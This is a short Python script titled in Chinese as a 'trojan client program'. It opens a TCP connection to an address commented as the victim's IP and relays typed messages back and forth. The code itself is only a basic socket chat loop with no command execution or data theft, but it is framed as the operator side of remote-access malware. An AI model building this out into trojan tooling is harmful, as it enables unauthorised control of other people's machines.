# 木马客户端程序
import socket
import os

def main():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = '0.0.0.0'  # 受害者的ip地址
    port = 8080
    s.connect((host, port))

    while True:
        data_recv = s.recv(1024)
        print(data_recv.decode('utf-8'))
        msg = input("send msg:")
        s.send(msg.encode('utf-8'))
    s.close()


if __name__ == '__main__':
    main()